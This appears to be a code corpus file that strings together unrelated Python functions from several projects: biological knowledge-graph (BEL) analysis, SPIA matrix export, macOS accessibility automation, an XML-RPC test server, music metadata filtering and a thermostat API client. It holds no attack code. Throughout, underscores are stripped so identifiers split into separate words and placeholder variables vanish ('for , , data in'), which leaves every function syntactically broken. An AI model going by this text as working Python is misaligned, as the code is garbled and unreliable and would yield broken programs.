def reaction cartesian expansion ( graph : BEL Graph , accept unqualified edges : bool = True ) -> None : for u , v , d in list ( graph . edges ( data = True ) ) : # Deal with unqualified edges if CITATION not in d and accept unqualified edges : reaction cartesion expansion unqualified helper ( graph , u , v , d ) continue if isinstance ( u , Reaction ) and isinstance ( v , Reaction ) : catalysts = get catalysts in reaction ( u ) | get catalysts in reaction ( v ) for reactant , product in chain ( itt . product ( u . reactants , u . products ) , itt . product ( v . reactants , v . products ) ) : if reactant in catalysts or product in catalysts : continue graph . add increases ( reactant , product , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) for product , reactant in itt . product ( u . products , u . reactants ) : if reactant in catalysts or product in catalysts : continue graph . add qualified edge ( product , reactant , relation = d [ RELATION ] , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) elif isinstance ( u , Reaction ) : catalysts = get catalysts in reaction ( u ) for product in u . products : # Skip create increases edges between enzymes if product in catalysts : continue # Only add edge between v and reaction if the node is not part of the reaction # In practice skips has Reactant, has Product edges if v not in u . products and v not in u . reactants : graph . add increases ( product , v , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) for reactant in u . reactants : graph . add increases ( reactant , product , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) elif isinstance ( v , Reaction ) : for reactant in v . reactants : catalysts = get catalysts in reaction ( v ) # Skip create increases edges between enzymes if reactant in catalysts : continue # Only add edge between v and reaction if the node is not part of the reaction # In practice skips has Reactant, has Product edges if u not in v . products and u not in v . reactants : graph . add increases ( u , reactant , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) for product in v . products : graph . add increases ( reactant , product , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) remove reaction nodes ( graph )
def get graphs by ids ( self , network ids : Iterable [ int ] ) -> List [ BEL Graph ] : return [ self . networks [ network id ] for network id in network ids ]
def count author publications ( graph : BEL Graph ) -> typing . Counter [ str ] : authors = group as dict ( iter author publiations ( graph ) ) return Counter ( count dict values ( count defaultdict ( authors ) ) )
def count citation years ( graph : BEL Graph ) -> typing . Counter [ int ] : result = defaultdict ( set ) for , , data in graph . edges ( data = True ) : if CITATION not in data or CITATION DATE not in data [ CITATION ] : continue try : dt = ensure datetime ( data [ CITATION ] [ CITATION DATE ] ) result [ dt . year ] . add ( ( data [ CITATION ] [ CITATION TYPE ] , data [ CITATION ] [ CITATION REFERENCE ] ) ) except Exception : continue return count dict values ( result )
def get citation years ( graph : BEL Graph ) -> List [ Tuple [ int , int ] ] : return create timeline ( count citation years ( graph ) )
def count confidences ( graph : BEL Graph ) -> typing . Counter [ str ] : return Counter ( ( 'None' if ANNOTATIONS not in data or 'Confidence' not in data [ ANNOTATIONS ] else list ( data [ ANNOTATIONS ] [ 'Confidence' ] ) [ 0 ] ) for , , data in graph . edges ( data = True ) if CITATION in data # don't bother with unqualified statements )
def update context ( universe : BEL Graph , graph : BEL Graph ) : for namespace in get namespaces ( graph ) : if namespace in universe . namespace url : graph . namespace url [ namespace ] = universe . namespace url [ namespace ] elif namespace in universe . namespace pattern : graph . namespace pattern [ namespace ] = universe . namespace pattern [ namespace ] else : log . warning ( 'namespace: %s missing from universe' , namespace ) for annotation in get annotations ( graph ) : if annotation in universe . annotation url : graph . annotation url [ annotation ] = universe . annotation url [ annotation ] elif annotation in universe . annotation pattern : graph . annotation pattern [ annotation ] = universe . annotation pattern [ annotation ] elif annotation in universe . annotation list : graph . annotation list [ annotation ] = universe . annotation list [ annotation ] else : log . warning ( 'annotation: %s missing from universe' , annotation )
def count top centrality ( graph : BEL Graph , number : Optional [ int ] = 30 ) -> Mapping [ Base Entity , int ] : dd = nx . betweenness centrality ( graph ) dc = Counter ( dd ) return dict ( dc . most common ( number ) )
def get modifications count ( graph : BEL Graph ) -> Mapping [ str , int ] : return remove falsy values ( { 'Translocations' : len ( get translocated ( graph ) ) , 'Degradations' : len ( get degradations ( graph ) ) , 'Molecular Activities' : len ( get activities ( graph ) ) , } )
def remove falsy values ( counter : Mapping [ Any , int ] ) -> Mapping [ Any , int ] : return { label : count for label , count in counter . items ( ) if count }
def collapse variants by function ( graph : BEL Graph , func : str ) -> None : for parent node , variant node , data in graph . edges ( data = True ) : if data [ RELATION ] == HAS VARIANT and parent node . function == func : collapse pair ( graph , from node = variant node , to node = parent node )
def collapse edge passing predicates ( graph : BEL Graph , edge predicates : Edge Predicates = None ) -> None : for u , v , in filter edges ( graph , edge predicates = edge predicates ) : collapse pair ( graph , survivor = u , victim = v )
def collapse entrez equivalencies ( graph : BEL Graph ) : relation filter = build relation predicate ( EQUIVALENT TO ) source namespace filter = build source namespace filter ( [ 'EGID' , 'EG' , 'ENTREZ' ] ) edge predicates = [ relation filter , source namespace filter , ] collapse edge passing predicates ( graph , edge predicates = edge predicates )
def collapse nodes with same names ( graph : BEL Graph ) -> None : survivor mapping = defaultdict ( set ) # Collapse mapping dict victims = set ( ) # Things already mapped while iterating it = tqdm ( itt . combinations ( graph , r = 2 ) , total = graph . number of nodes ( ) * ( graph . number of nodes ( ) - 1 ) / 2 ) for a , b in it : if b in victims : continue a name , b name = a . get ( NAME ) , b . get ( NAME ) if not a name or not b name or a name . lower ( ) != b name . lower ( ) : continue if a . keys ( ) != b . keys ( ) : # not same version (might have variants) continue # Ensure that the values in the keys are also the same for k in set ( a . keys ( ) ) - { NAME , NAMESPACE } : if a [ k ] != b [ k ] : # something different continue survivor mapping [ a ] . add ( b ) # Keep track of things that has been already mapped victims . add ( b ) collapse nodes ( graph , survivor mapping )
def main ( output ) : from hbp knowledge import get graph graph = get graph ( ) text = to html ( graph ) print ( text , file = output )
def enrich complexes ( graph : BEL Graph ) -> None : nodes = list ( get nodes by function ( graph , COMPLEX ) ) for u in nodes : for v in u . members : graph . add has component ( u , v )
def enrich composites ( graph : BEL Graph ) : nodes = list ( get nodes by function ( graph , COMPOSITE ) ) for u in nodes : for v in u . members : graph . add has component ( u , v )
def enrich reactions ( graph : BEL Graph ) : nodes = list ( get nodes by function ( graph , REACTION ) ) for u in nodes : for v in u . reactants : graph . add has reactant ( u , v ) for v in u . products : graph . add has product ( u , v )
def get namespaces with incorrect names ( graph : BEL Graph ) -> Set [ str ] : return { exc . namespace for , exc , in graph . warnings if isinstance ( exc , ( Missing Namespace Name Warning , Missing Namespace Regex Warning ) ) }
def get undefined namespaces ( graph : BEL Graph ) -> Set [ str ] : return { exc . namespace for , exc , in graph . warnings if isinstance ( exc , Undefined Namespace Warning ) }
def count defaultdict ( dict of lists : Mapping [ X , List [ Y ] ] ) -> Mapping [ X , typing . Counter [ Y ] ] : return { k : Counter ( v ) for k , v in dict of lists . items ( ) }
def tanimoto set similarity ( x : Iterable [ X ] , y : Iterable [ X ] ) -> float : a , b = set ( x ) , set ( y ) union = a | b if not union : return 0.0 return len ( a & b ) / len ( union )
def barh ( d , plt , title = None ) : labels = sorted ( d , key = d . get ) index = range ( len ( labels ) ) plt . yticks ( index , labels ) plt . barh ( index , [ d [ v ] for v in labels ] ) if title is not None : plt . title ( title )
def barv ( d , plt , title = None , rotation = 'vertical' ) : labels = sorted ( d , key = d . get , reverse = True ) index = range ( len ( labels ) ) plt . xticks ( index , labels , rotation = rotation ) plt . bar ( index , [ d [ v ] for v in labels ] ) if title is not None : plt . title ( title )
def relation set has contradictions ( relations : Set [ str ] ) -> bool : has increases = any ( relation in CAUSAL INCREASE RELATIONS for relation in relations ) has decreases = any ( relation in CAUSAL DECREASE RELATIONS for relation in relations ) has cnc = any ( relation == CAUSES NO CHANGE for relation in relations ) return 1 < sum ( [ has cnc , has decreases , has increases ] )
def get network summary dict ( graph : BEL Graph ) -> Mapping : return dict ( # Counters function count = count functions ( graph ) , modifications count = get modifications count ( graph ) , relation count = count relations ( graph ) , authors count = count authors ( graph ) . most common ( 15 ) , variants count = count variants ( graph ) , namespaces count = count namespaces ( graph ) , hub data = { ( node . name or node . identifier if NAME in node or IDENTIFIER in node else str ( node ) ) : degree for node , degree in get top hubs ( graph , n = 15 ) } , disease data = { ( node . name or node . identifier if NAME in node or IDENTIFIER in node else str ( node ) ) : count for node , count in get top pathologies ( graph , n = 15 ) } , # Bio Grammar regulatory pairs = [ get pair tuple ( u , v ) for u , v in get regulatory pairs ( graph ) ] , unstable pairs = list ( itt . chain ( ( get pair tuple ( u , v ) + ( 'Chaotic' , ) for u , v , in get chaotic pairs ( graph ) ) , ( get pair tuple ( u , v ) + ( 'Dampened' , ) for u , v , in get dampened pairs ( graph ) ) , ) ) , contradictory pairs = [ get pair tuple ( u , v ) + ( relation , ) for u , v , relation in get contradiction summary ( graph ) ] , contradictory triplets = list ( itt . chain ( ( get triplet tuple ( a , b , c ) + ( 'Separate' , ) for a , b , c in get separate unstable correlation triples ( graph ) ) , ( get triplet tuple ( a , b , c ) + ( 'Mutual' , ) for a , b , c in get mutually unstable correlation triples ( graph ) ) , ( get triplet tuple ( a , b , c ) + ( 'Jens' , ) for a , b , c in get jens unstable ( graph ) ) , ( get triplet tuple ( a , b , c ) + ( 'Increase Mismatch' , ) for a , b , c in get increase mismatch triplets ( graph ) ) , ( get triplet tuple ( a , b , c ) + ( 'Decrease Mismatch' , ) for a , b , c in get decrease mismatch triplets ( graph ) ) , ) ) , unstable triplets = list ( itt . chain ( ( get triplet tuple ( a , b , c ) + ( 'Chaotic' , ) for a , b , c in get chaotic triplets ( graph ) ) , ( get triplet tuple ( a , b , c ) + ( 'Dampened' , ) for a , b , c in get dampened triplets ( graph ) ) , ) ) , causal pathologies = sorted ( { get pair tuple ( u , v ) + ( graph [ u ] [ v ] [ k ] [ RELATION ] , ) for u , v , k in filter edges ( graph , has pathology causal ) } ) , # Misc. undefined namespaces = get undefined namespaces ( graph ) , undefined annotations = get undefined annotations ( graph ) , namespaces with incorrect names = get namespaces with incorrect names ( graph ) , unused namespaces = get unused namespaces ( graph ) , unused annotations = get unused annotations ( graph ) , unused list annotation values = get unused list annotation values ( graph ) , naked names = get naked names ( graph ) , error count = count error types ( graph ) , # Errors error groups = get most common errors ( graph ) , syntax errors = get syntax errors ( graph ) , # Bibliometrics citation years = get citation years ( graph ) , confidence count = count confidences ( graph ) , )
def group nodes by annotation ( graph : BEL Graph , annotation : str = 'Subgraph' ) -> Mapping [ str , Set [ Base Entity ] ] : result = defaultdict ( set ) for u , v , d in graph . edges ( data = True ) : if not edge has annotation ( d , annotation ) : continue result [ d [ ANNOTATIONS ] [ annotation ] ] . add ( u ) result [ d [ ANNOTATIONS ] [ annotation ] ] . add ( v ) return dict ( result )
def build expand node neighborhood by hash ( manager : Manager ) -> Callable [ [ BEL Graph , BEL Graph , str ] , None ] : @ uni in place transformation def expand node neighborhood by hash ( universe : BEL Graph , graph : BEL Graph , node hash : str ) -> None : """Expand around the neighborhoods of a node by identifier.""" node = manager . get dsl by hash ( node hash ) return expand node neighborhood ( universe , graph , node ) return expand node neighborhood by hash
def build delete node by hash ( manager : Manager ) -> Callable [ [ BEL Graph , str ] , None ] : @ in place transformation def delete node by hash ( graph : BEL Graph , node hash : str ) -> None : """Remove a node by identifier.""" node = manager . get dsl by hash ( node hash ) graph . remove node ( node ) return delete node by hash
def update spia matrices ( spia matrices : Dict [ str , pd . Data Frame ] , u : Central Dogma , v : Central Dogma , edge data : Edge Data , ) -> None : if u . namespace . upper ( ) != 'HGNC' or v . namespace . upper ( ) != 'HGNC' : return u name = u . name v name = v . name relation = edge data [ RELATION ] if relation in CAUSAL INCREASE RELATIONS : # If it has pmod check which one and add it to the corresponding matrix if v . variants and any ( isinstance ( variant , Protein Modification ) for variant in v . variants ) : for variant in v . variants : if not isinstance ( variant , Protein Modification ) : continue if variant [ IDENTIFIER ] [ NAME ] == "Ub" : spia matrices [ "activation ubiquination" ] [ u name ] [ v name ] = 1 elif variant [ IDENTIFIER ] [ NAME ] == "Ph" : spia matrices [ "activation phosphorylation" ] [ u name ] [ v name ] = 1 elif isinstance ( v , ( Gene , Rna ) ) : # Normal increase, add activation spia matrices [ 'expression' ] [ u name ] [ v name ] = 1 else : spia matrices [ 'activation' ] [ u name ] [ v name ] = 1 elif relation in CAUSAL DECREASE RELATIONS : # If it has pmod check which one and add it to the corresponding matrix if v . variants and any ( isinstance ( variant , Protein Modification ) for variant in v . variants ) : for variant in v . variants : if not isinstance ( variant , Protein Modification ) : continue if variant [ IDENTIFIER ] [ NAME ] == "Ub" : spia matrices [ 'inhibition ubiquination' ] [ u name ] [ v name ] = 1 elif variant [ IDENTIFIER ] [ NAME ] == "Ph" : spia matrices [ "inhibition phosphorylation" ] [ u name ] [ v name ] = 1 elif isinstance ( v , ( Gene , Rna ) ) : # Normal decrease, check which matrix spia matrices [ "repression" ] [ u name ] [ v name ] = 1 else : spia matrices [ "inhibition" ] [ u name ] [ v name ] = 1 elif relation == ASSOCIATION : spia matrices [ "binding association" ] [ u name ] [ v name ] = 1
def spia matrices to tsvs ( spia matrices : Mapping [ str , pd . Data Frame ] , directory : str ) -> None : os . makedirs ( directory , exist ok = True ) for relation , df in spia matrices . items ( ) : df . to csv ( os . path . join ( directory , f'{relation}.tsv' ) , index = True )
def main ( graph : BEL Graph , xlsx : str , tsvs : str ) : if not xlsx and not tsvs : click . secho ( 'Specify at least one option --xlsx or --tsvs' , fg = 'red' ) sys . exit ( 1 ) spia matrices = bel to spia matrices ( graph ) if xlsx : spia matrices to excel ( spia matrices , xlsx ) if tsvs : spia matrices to tsvs ( spia matrices , tsvs )
def get entrez gene data ( entrez ids : Iterable [ Union [ str , int ] ] ) : url = PUBMED GENE QUERY URL . format ( ',' . join ( str ( x ) . strip ( ) for x in entrez ids ) ) response = requests . get ( url ) tree = Element Tree . fromstring ( response . content ) return { element . attrib [ 'uid' ] : { 'summary' : sanitize ( element . find ( 'Summary' ) . text ) , 'description' : element . find ( 'Description' ) . text } for element in tree . findall ( './Document Summary Set/Document Summary' ) }
def get largest component ( graph : BEL Graph ) -> BEL Graph : biggest component nodes = max ( nx . weakly connected components ( graph ) , key = len ) return subgraph ( graph , biggest component nodes )
def self edge filter ( : BEL Graph , source : Base Entity , target : Base Entity , : str ) -> bool : return source == target
def has protein modification increases activity ( graph : BEL Graph , source : Base Entity , target : Base Entity , key : str , ) -> bool : edge data = graph [ source ] [ target ] [ key ] return has protein modification ( graph , source ) and part has modifier ( edge data , OBJECT , ACTIVITY )
def has degradation increases activity ( data : Dict ) -> bool : return part has modifier ( data , SUBJECT , DEGRADATION ) and part has modifier ( data , OBJECT , ACTIVITY )
def has translocation increases activity ( data : Dict ) -> bool : return part has modifier ( data , SUBJECT , TRANSLOCATION ) and part has modifier ( data , OBJECT , ACTIVITY )
def complex has member ( graph : BEL Graph , complex node : Complex Abundance , member node : Base Entity ) -> bool : return any ( # TODO can't you look in the members of the complex object (if it's enumerated) v == member node for , v , data in graph . out edges ( complex node , data = True ) if data [ RELATION ] == HAS COMPONENT )
def complex increases activity ( graph : BEL Graph , u : Base Entity , v : Base Entity , key : str ) -> bool : return ( isinstance ( u , ( Complex Abundance , Named Complex Abundance ) ) and complex has member ( graph , u , v ) and part has modifier ( graph [ u ] [ v ] [ key ] , OBJECT , ACTIVITY ) )
def find activations ( graph : BEL Graph ) : for u , v , key , data in graph . edges ( keys = True , data = True ) : if u != v : continue bel = graph . edge to bel ( u , v , data ) line = data . get ( LINE ) if line is None : continue # this was inferred, so need to investigate another way elif has protein modification increases activity ( graph , u , v , key ) : print ( line , '- pmod changes -' , bel ) find related ( graph , v , data ) elif has degradation increases activity ( data ) : print ( line , '- degradation changes -' , bel ) find related ( graph , v , data ) elif has translocation increases activity ( data ) : print ( line , '- translocation changes -' , bel ) find related ( graph , v , data ) elif complex increases activity ( graph , u , v , key ) : print ( line , '- complex changes - ' , bel ) find related ( graph , v , data ) elif has same subject object ( graph , u , v , key ) : print ( line , '- same sub/obj -' , bel ) else : print ( line , '- *** - ' , bel )
def summarize edge filter ( graph : BEL Graph , edge predicates : Edge Predicates ) -> None : passed = count passed edge filter ( graph , edge predicates ) print ( '{}/{} edges passed {}' . format ( passed , graph . number of edges ( ) , ( ', ' . join ( edge filter . name for edge filter in edge predicates ) if isinstance ( edge predicates , Iterable ) else edge predicates . name ) ) )
def node has namespace ( node : Base Entity , namespace : str ) -> bool : ns = node . get ( NAMESPACE ) return ns is not None and ns == namespace
def node has namespaces ( node : Base Entity , namespaces : Set [ str ] ) -> bool : ns = node . get ( NAMESPACE ) return ns is not None and ns in namespaces
def get cutoff ( value : float , cutoff : Optional [ float ] = None ) -> int : cutoff = cutoff if cutoff is not None else 0 if value > cutoff : return 1 if value < ( - 1 * cutoff ) : return - 1 return 0
def one sided ( value : float , distribution : List [ float ] ) -> float : assert distribution return sum ( value < element for element in distribution ) / len ( distribution )
def get drug target interactions ( manager : Optional [ 'bio2bel drugbank.manager' ] = None ) -> Mapping [ str , List [ str ] ] : if manager is None : import bio2bel drugbank manager = bio2bel drugbank . Manager ( ) if not manager . is populated ( ) : manager . populate ( ) return manager . get drug to hgnc symbols ( )
def multi run epicom ( graphs : Iterable [ BEL Graph ] , path : Union [ None , str , Text IO ] ) -> None : if isinstance ( path , str ) : with open ( path , 'w' ) as file : multi run helper file wrapper ( graphs , file ) else : multi run helper file wrapper ( graphs , path )
def main ( ) : logging . basic Config ( level = logging . INFO ) log . set Level ( logging . INFO ) bms base = get bms base ( ) neurommsig base = get neurommsig base ( ) neurommsig excel dir = os . path . join ( neurommsig base , 'resources' , 'excels' , 'neurommsig' ) nift values = get nift values ( ) log . info ( 'Starting Alzheimers' ) ad path = os . path . join ( neurommsig excel dir , 'alzheimers' , 'alzheimers.xlsx' ) ad df = preprocess ( ad path ) with open ( os . path . join ( bms base , 'aetionomy' , 'alzheimers' , 'neurommsigdb ad.bel' ) , 'w' ) as ad file : write neurommsig bel ( ad file , ad df , mesh alzheimer , nift values ) log . info ( 'Starting Parkinsons' ) pd path = os . path . join ( neurommsig excel dir , 'parkinsons' , 'parkinsons.xlsx' ) pd df = preprocess ( pd path ) with open ( os . path . join ( bms base , 'aetionomy' , 'parkinsons' , 'neurommsigdb pd.bel' ) , 'w' ) as pd file : write neurommsig bel ( pd file , pd df , mesh parkinson , nift values )
def unscored nodes iter ( self ) -> Base Entity : for node , data in self . graph . nodes ( data = True ) : if self . tag not in data : yield node
def remove random edge until has leaves ( self ) -> None : while True : leaves = set ( self . iter leaves ( ) ) if leaves : return self . remove random edge ( )
def calculate score ( self , node : Base Entity ) -> float : score = ( self . graph . nodes [ node ] [ self . tag ] if self . tag in self . graph . nodes [ node ] else self . default score ) for predecessor , , d in self . graph . in edges ( node , data = True ) : if d [ RELATION ] in CAUSAL INCREASE RELATIONS : score += self . graph . nodes [ predecessor ] [ self . tag ] elif d [ RELATION ] in CAUSAL DECREASE RELATIONS : score -= self . graph . nodes [ predecessor ] [ self . tag ] return score
def node exclusion filter builder ( nodes : Iterable [ Base Entity ] ) -> Node Predicate : node set = set ( nodes ) def exclusion filter ( : BEL Graph , node : Base Entity ) -> bool : return node not in node set return exclusion filter
def variants of ( graph : BEL Graph , node : Protein , modifications : Optional [ Set [ str ] ] = None , ) -> Set [ Protein ] : if modifications : return get filtered variants of ( graph , node , modifications ) return { v for u , v , key , data in graph . edges ( keys = True , data = True ) if ( u == node and data [ RELATION ] == HAS VARIANT and pybel . struct . has protein modification ( v ) ) }
def get variants to controllers ( graph : BEL Graph , node : Protein , modifications : Optional [ Set [ str ] ] = None , ) -> Mapping [ Protein , Set [ Protein ] ] : rv = defaultdict ( set ) variants = variants of ( graph , node , modifications ) for controller , variant , data in graph . in edges ( variants , data = True ) : if data [ RELATION ] in CAUSAL RELATIONS : rv [ variant ] . add ( controller ) return rv
def group dict set ( iterator : Iterable [ Tuple [ A , B ] ] ) -> Mapping [ A , Set [ B ] ] : d = defaultdict ( set ) for key , value in iterator : d [ key ] . add ( value ) return dict ( d )
def boilerplate ( name , contact , description , pmids , version , copyright , authors , licenses , disclaimer , output ) : from . document utils import write boilerplate write boilerplate ( name = name , version = version , description = description , authors = authors , contact = contact , copyright = copyright , licenses = licenses , disclaimer = disclaimer , pmids = pmids , file = output , )
def get pmids ( graph : BEL Graph , output : Text IO ) : for pmid in get pubmed identifiers ( graph ) : click . echo ( pmid , file = output )
def glob match ( self , pattern , string ) : # regex flags Multi-line, Unicode, Locale return bool ( re . match ( fnmatch . translate ( pattern ) , string , re . M | re . U | re . L ) )
def get Running Apps ( cls ) : def run Loop And Exit ( ) : App Helper . stop Event Loop ( ) App Helper . call Later ( 1 , run Loop And Exit ) App Helper . run Console Event Loop ( ) # Get a list of running applications ws = App Kit . NS Workspace . shared Workspace ( ) apps = ws . running Applications ( ) return apps
def launch App By Bundle Id ( bundle ID ) : # NS Workspace Launch Allowing Classic Startup does nothing on any # modern system that doesn't have the classic environment installed. # Encountered a bug when passing 0 for no options on 10.6 Py Obj C. ws = App Kit . NS Workspace . shared Workspace ( ) # Sorry about the length of the following line r = ws . launch App With Bundle Identifier options additional Event Param Descriptor launch Identifier ( bundle ID , App Kit . NS Workspace Launch Allowing Classic Startup , App Kit . NS Apple Event Descriptor . null Descriptor ( ) , None ) # On 10.6, this returns a tuple - first element bool result, second is # a number. Let's use the bool result. if not r [ 0 ] : raise Runtime Error ( 'Error launching specified application.' )
def get Actions ( self ) : actions = a11y . AXUI Element . get Actions ( self ) # strip leading AX from actions - help distinguish them from attributes return [ action [ 2 : ] for action in actions ]
def perform Action ( self , action ) : try : a11y . AXUI Element . perform Action ( self , 'AX%s' % action ) except a11y . Error Unsupported as e : sierra ver = '10.12' if mac ver ( ) [ 0 ] < sierra ver : raise e else : pass
def generate Children ( self ) : try : children = self . AX Children except a11y . Error : return if children : for child in children : yield child
def generate Children R ( self , target = None ) : if target is None : target = self try : children = target . AX Children except a11y . Error : return if children : for child in children : yield child for c in self . generate Children R ( child ) : yield c
def match Other ( self , obj , * * kwargs ) : if obj is not None : # Need to check that the returned UI element wasn't destroyed first: if self . find First R ( * * kwargs ) : return obj . match ( * * kwargs ) return False
def generate Find ( self , * * kwargs ) : for needle in self . generate Children ( ) : if needle . match ( * * kwargs ) : yield needle
def generate Find R ( self , * * kwargs ) : for needle in self . generate Children R ( ) : if needle . match ( * * kwargs ) : yield needle
def find All ( self , * * kwargs ) : result = [ ] for item in self . generate Find ( * * kwargs ) : result . append ( item ) return result
def get Bundle Id ( self ) : ra = App Kit . NS Running Application app = ra . running Application With Process Identifier ( self . get Pid ( ) ) return app . bundle Identifier ( )
def pop Up Item ( self , * args ) : self . Press ( ) time . sleep ( .5 ) return self . menu Item ( self , * args )
def convenience Match ( self , role , attr , match ) : kwargs = { } # If the user supplied some text to search for, # supply that in the kwargs if match : kwargs [ attr ] = match return self . find All ( AX Role = role , * * kwargs )
def convenience Match R ( self , role , attr , match ) : kwargs = { } # If the user supplied some text to search for, # supply that in the kwargs if match : kwargs [ attr ] = match return self . find All R ( AX Role = role , * * kwargs )
def main ( port = 4118 , parentpid = None ) : if "LDTP DEBUG" in os . environ : ldtp debug = True else : ldtp debug = False ldtp debug file = os . environ . get ( 'LDTP DEBUG FILE' , None ) if ldtp debug : print ( "Parent PID: {}" . format ( int ( parentpid ) ) ) if ldtp debug file : with open ( unicode ( ldtp debug file ) , "a" ) as fp : fp . write ( "Parent PID: {}" . format ( int ( parentpid ) ) ) server = LDTP Server ( ( '' , port ) , allow none = True , log Requests = ldtp debug , request Handler = Request Handler ) server . register introspection functions ( ) server . register multicall functions ( ) ldtp inst = core . Core ( ) server . register instance ( ldtp inst ) if parentpid : thread . start new thread ( notifyclient , ( parentpid , ) ) try : server . serve forever ( ) except Keyboard Interrupt : pass except : if ldtp debug : print ( traceback . format exc ( ) ) if ldtp debug file : with open ( ldtp debug file , "a" ) as fp : fp . write ( traceback . format exc ( ) )
def server bind ( self , * args , * * kwargs ) : self . socket . setsockopt ( socket . SOL SOCKET , socket . SO REUSEADDR , 1 ) # Can't use super() here since Simple XMLRPC Server is an old-style class Simple XMLRPC Server . server bind ( self , * args , * * kwargs )
def cast to list ( position ) : @ wrapt . decorator def wrapper ( function , instance , args , kwargs ) : if not isinstance ( args [ position ] , list ) : args = list ( args ) args [ position ] = [ args [ position ] ] args = tuple ( args ) return function ( * args , * * kwargs ) return wrapper
def forbidden attributes ( obj ) : for key in list ( obj . data . keys ( ) ) : if key in list ( obj . reserved keys . keys ( ) ) : obj . data . pop ( key ) return obj
def convert cygwin path ( path ) : try : win path = subprocess . check output ( [ "cygpath" , "-aw" , path ] , universal newlines = True ) . strip ( ) except ( File Not Found Error , subprocess . Called Process Error ) : logger . exception ( "Call to cygpath failed." ) raise return win path
def get mutagen metadata ( filepath ) : try : metadata = mutagen . File ( filepath , easy = True ) except mutagen . Mutagen Error : logger . warning ( "Can't load {} as music file." . format ( filepath ) ) raise return metadata
def mutagen fields to single value ( metadata ) : return dict ( ( k , v [ 0 ] ) for k , v in metadata . items ( ) if v )
def normalize metadata ( metadata ) : metadata = str ( metadata ) metadata = metadata . lower ( ) metadata = re . sub ( r'\/\s*\d+' , '' , metadata ) # Remove "/<totaltracks>" from track number. metadata = re . sub ( r'^0+([0-9]+)' , r'\1' , metadata ) # Remove leading zero(s) from track number. metadata = re . sub ( r'^\d+\.+' , '' , metadata ) # Remove dots from track number. metadata = re . sub ( r'[^\w\s]' , '' , metadata ) # Remove any non-words. metadata = re . sub ( r'\s+' , ' ' , metadata ) # Reduce multiple spaces to a single space. metadata = re . sub ( r'^\s+' , '' , metadata ) # Remove leading space. metadata = re . sub ( r'\s+$' , '' , metadata ) # Remove trailing space. metadata = re . sub ( r'^the\s+' , '' , metadata , re . I ) # Remove leading "the". return metadata
def check field value ( field value , pattern ) : if isinstance ( field value , list ) : return any ( re . search ( pattern , str ( value ) , re . I ) for value in field value ) else : return re . search ( pattern , str ( field value ) , re . I )
def check filters ( song , include filters = None , exclude filters = None , all includes = False , all excludes = False ) : include = True if include filters : if all includes : if not all ( field in song and check field value ( song [ field ] , pattern ) for field , pattern in include filters ) : include = False else : if not any ( field in song and check field value ( song [ field ] , pattern ) for field , pattern in include filters ) : include = False if exclude filters : if all excludes : if all ( field in song and check field value ( song [ field ] , pattern ) for field , pattern in exclude filters ) : include = False else : if any ( field in song and check field value ( song [ field ] , pattern ) for field , pattern in exclude filters ) : include = False return include
def url ( self , endpoint , url data = None , parameters = None ) : try : url = '%s/%s' % ( self . base url , self . endpoints [ endpoint ] ) except Key Error : raise End Point Does Not Exist ( endpoint ) if url data : url = url % url data if parameters : # url = url?key=value&key=value&key=value... url = '%s?%s' % ( url , urllib . urlencode ( parameters , True ) ) return url
def httplib2 init ( username , password ) : obj = httplib2 . Http ( ) if username and password : obj . add credentials ( username , password ) return obj
def prepare to run ( self ) : self . clock . reset ( ) for e in self . entities : e . prepare to run ( self . clock , self . period count )
def run ( self ) : self . prepare to run ( ) for i in range ( 0 , self . period count ) : for e in self . entities : e . run ( self . clock ) self . clock . tick ( )
def get ( self , key , default = None ) : if self . in memory : return self . memory db . get ( key , default ) else : db = self . read file ( ) return db . get ( key , default )
def paginate link tag ( item ) : a tag = Page . default link tag ( item ) if item [ 'type' ] == 'current page' : return make html tag ( 'li' , a tag , * * { 'class' : 'blue white-text' } ) return make html tag ( 'li' , a tag )
def set state ( id , body ) : url = DEVICE URL % id if "mode" in body : url = MODES URL % id arequest = requests . put ( url , headers = HEADERS , data = json . dumps ( body ) ) status code = str ( arequest . status code ) if status code != '202' : LOGGER . error ( "State not accepted. " + status code ) return False
def get modes ( id ) : url = MODES URL % id arequest = requests . get ( url , headers = HEADERS ) status code = str ( arequest . status code ) if status code == '401' : LOGGER . error ( "Token expired." ) return False return arequest . json ( )
def get usage ( id ) : url = USAGE URL % id arequest = requests . get ( url , headers = HEADERS ) status code = str ( arequest . status code ) if status code == '401' : LOGGER . error ( "Token expired." ) return False try : return arequest . json ( ) except Value Error : LOGGER . info ( "Failed to get usage. Not supported by unit?" ) return None
def get device ( id ) : url = DEVICE URL % id arequest = requests . get ( url , headers = HEADERS ) status code = str ( arequest . status code ) if status code == '401' : LOGGER . error ( "Token expired." ) return False return arequest . json ( )
def get locations ( ) : arequest = requests . get ( LOCATIONS URL , headers = HEADERS ) status code = str ( arequest . status code ) if status code == '401' : LOGGER . error ( "Token expired." ) return False return arequest . json ( )
def get vacations ( ) : arequest = requests . get ( VACATIONS URL , headers = HEADERS ) status code = str ( arequest . status code ) if status code == '401' : LOGGER . error ( "Token expired." ) return False return arequest . json ( )
def create vacation ( body ) : arequest = requests . post ( VACATIONS URL , headers = HEADERS , data = json . dumps ( body ) ) status code = str ( arequest . status code ) if status code != '200' : LOGGER . error ( "Failed to create vacation. " + status code ) LOGGER . error ( arequest . json ( ) ) return False return arequest . json ( )
def delete vacation ( id ) : arequest = requests . delete ( VACATIONS URL + "/" + id , headers = HEADERS ) status code = str ( arequest . status code ) if status code != '202' : LOGGER . error ( "Failed to delete vacation. " + status code ) return False return True
